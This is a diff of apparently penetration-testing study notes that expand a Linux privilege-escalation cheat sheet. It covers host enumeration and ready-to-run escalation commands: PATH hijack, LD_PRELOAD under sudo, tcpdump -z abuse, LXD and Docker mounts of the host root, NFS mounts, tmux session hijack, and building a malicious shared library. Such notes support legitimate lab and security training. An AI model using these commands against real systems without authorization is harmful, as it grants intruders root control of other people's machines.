@@ -614,79 +614,149 @@ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
 ##### Linux Priv Esc
 
 ```
-#Find Writable Directories
-find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
-
-#what operating system and version we are
+#System Info, OS and version
 cat /etc/os-release
+cat /etc/lsb-release
+uname -a
 
-#Check Current Path, environment variables, printers, cpu, etc.
+#Environment Info, PATH, variables, CPU, shells, printers
 echo $PATH; env; uname -a; lscpu; cat /etc/shells; lpstat
 
-#unmounted drives
+#PATH Manipulation, Add current directory to PATH (potential hijack)
+echo $PATH
+PATH=.:${PATH}
+
+#Users & Processes, Root processes and logged-in users
+ps aux | grep root
+ps au
+
+#Home Directories, List user homes
+ls /home
+
+#SSH Keys, Check for private keys
+ls -l ~/.ssh
+
+#Command History, Review user history
+history
+
+#Sudo Privileges, Check allowed commands
+sudo -l
+
+#Groups, Check sudo group membership
+getent group sudo
+
+#Writable Directories, Find world-writable dirs
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+
+#Writable Files, Find world-writable files
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+#Mounted Drives, Check fstab and mounts
 cat /etc/fstab
 cat /etc/fstab | grep -v "#" | column -t
+lsblk
 
-#Hiddent files and Directories
+#Hidden Files & Configs, Locate hidden and config files
 find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
 find / -type d -name ".*" -ls 2>/dev/null
 find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
 
-#History Files
+#History Files, Look for saved histories
 find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
 
-#Routing tables
-netstat -rn
-
-#for acitve directory check /etc/resolv.conf
-
-#list groups
-getent group sudo
-
-#Cron jobs
+#Cron Jobs, Scheduled tasks
+ls -la /etc/cron.daily/
 ls -la /etc/cron.daily/
 
-#proc
+#Processes via /proc, Inspect running commands
 find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
 
-#GTFO Bins
-for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
+#Network, Routing table
+netstat -rn
 
-#strace
-strace ping -c1 10.129.112.20
+#DNS / AD Check, Domain resolution
+cat /etc/resolv.conf
 
-#Scripts
+#Scripts, Find shell scripts
 find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
 
-#Enumerating Capabilities
+#SUID Binaries, Find SUID files
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+#SGID Binaries, Find SGID files
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+
+#Capabilities, Enumerate capabilities
 find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 
-#Screen -v Screen version 4.05.00 (GNU) 10-Dec-16, suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
-https://www.exploit-db.com/exploits/41154
+#Shared Libraries, Inspect dependencies
+ldd /bin/ls
+readelf -d payroll | grep PATH
 
-#Find Cronjobs, interesting files or directories
-find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
-pspy32 or 64 to check for interesting running jobs, such as cronjobs
+#Exploit Compilation, Compile C exploit
+gcc kernel_expoit.c -o kernel_expoit
 
-#Check if there are any containers LXD or part of group
-id = 116(lxd) 
+#Shared Library Compilation, Create malicious .so
+gcc src.c -fPIC -shared -o /development/libshared.so
+
+#LD_PRELOAD PrivEsc, Abuse sudo + preload
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+
+#Processes Monitoring, Observe cron/jobs
+./pspy64 -pf -i 1000
+
+#strace Debugging, Trace system calls
+strace ping -c1 10.129.112.20
+
+#GTFOBins Check, Match installed binaries
+for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
+
+#tcpdump PrivEsc, Abuse sudo tcpdump
+sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+#LXD Group PrivEsc, Abuse container privileges
+id
+lxd init
 lxc image import ubuntu-template.tar.xz --alias ubuntutemp
 lxc init ubuntutemp privesc -c security.privileged=true
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 lxc start privesc
 lxc exec privesc /bin/bash
 
-#Docker
-id = 118(docker)
+#Alternative LXD Flow
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+lxc init alpine r00t -c security.privileged=true
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+lxc start r00t
+
+#Docker PrivEsc, Abuse docker group
+id
 docker image ls
-#example
 docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
-#alternative:
 docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
 
-#logrotate, need write access to log files, logrotate must run as root or privileged, and be on version 3.86, 3.11, 3.15.0, 3.18.0
+#NFS Shares, Enumerate and mount
+showmount -e 10.129.2.12
+sudo mount -t nfs 10.129.2.12:/tmp /mnt
 
-#LD_Preload Priv Esc; Needs sudo priv on file: example apache2, (root) NOPASSWD: /usr/sbin/apache2 restart
+#tmux Shared Session, Hijack session
+tmux -S /shareds new -s debugsess
+
+#Logrotate Exploit Conditions
+#Requires writable logs + root execution + vulnerable version (3.8.6, 3.11, 3.15.0, 3.18.0)
+
+#Screen Version Check, Known vuln
+screen -v
+
+#Writable Files (Alt), Find interesting writable files
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+#Process Monitoring Tool
+pspy32 or pspy64
+
+#Security Audit Tool
+./lynis audit system
 
 ```
 
